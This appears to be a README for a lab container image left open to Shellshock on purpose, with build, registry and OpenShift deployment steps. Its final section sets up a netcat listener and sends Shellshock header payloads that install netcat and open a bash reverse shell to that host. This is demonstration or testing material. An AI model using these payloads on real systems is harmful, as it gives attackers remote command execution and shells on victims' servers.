# Shellshock vulnerable image

## Build

Old CentOS images are here: https://vault.centos.org/

Install it in a virtual machine.

```sh
sudo virt-install --name centos6 --os-variant centos6.5 --memory 2048 --vcpus 2 --disk size=10,alias.name=centos6 --hvm --network network=default --cdrom /var/lib/libvirt/images/CentOS-6.5-x86_64-minimal.iso
```

Mount the qcow2 image as explained [here](https://gist.github.com/shamil/62935d9b456a6f9877b5).

```sh
sudo qemu-nbd --connect=/dev/nbd0 /var/lib/libvirt/images/disk.qcow2
sudo mount /dev/mapper/VolGroup-lv_root /mnt/
sudo tar -cvf /tmp/centos6.tar . -C /mnt
sudo umount /mnt
sudo qemu-nbd --disconnect /dev/nbd0
```

Create the container image.

```sh
sudo podman import /tmp/centos6.tar vulnerable-centos:6
sudo buildah bud -t vulnerable-httpd:centos-6 .
```

Push the image to the registry of your choice.

```sh
sudo podman tag localhost/vulnerable-httpd:centos-6 registry.itix.xyz/vulnerable/vulnerable-httpd:centos-6
sudo podman push registry.itix.xyz/vulnerable/vulnerable-httpd:centos-6
```

## Usage

```sh
sudo podman run -d --rm --name vulnerable-httpd vulnerable-httpd:centos-6
POD_IP=$(sudo podman inspect --format "{{.NetworkSettings.IPAddress}}" vulnerable-httpd)
```

```
sh-4.1# curl http://$POD_IP/cgi-bin/hello.cgi -H "X-Name: Nicolas"
Hello, Nicolas!
sh-4.1# curl http://$POD_IP/cgi-bin/hello.cgi
Hello, World!
```

## Deployment

```sh
oc apply -f openshift/
```

## Exploit

Find the URL of the vulnerable CGI-BIN.

```sh
export TARGET="https://$(oc get route frontend -n vulnerable-httpd -o jsonpath="{.spec.host}")/cgi-bin/hello.cgi"
```

Start a C&C server.

```sh
sudo firewall-cmd --add-port 6666/tcp
nc -l -p 6666
```

Set the IP address of the C&C server.

```sh
export SERVER_IP=192.168.6.2
```

Exploit the target.

```sh
curl "$TARGET" -H "X-Name: () { :; }; /usr/bin/yum install -y nc"
curl "$TARGET" -H "X-Name: () { :; }; /bin/bash -i >& /dev/tcp/$SERVER_IP/6666 0>&1"
```
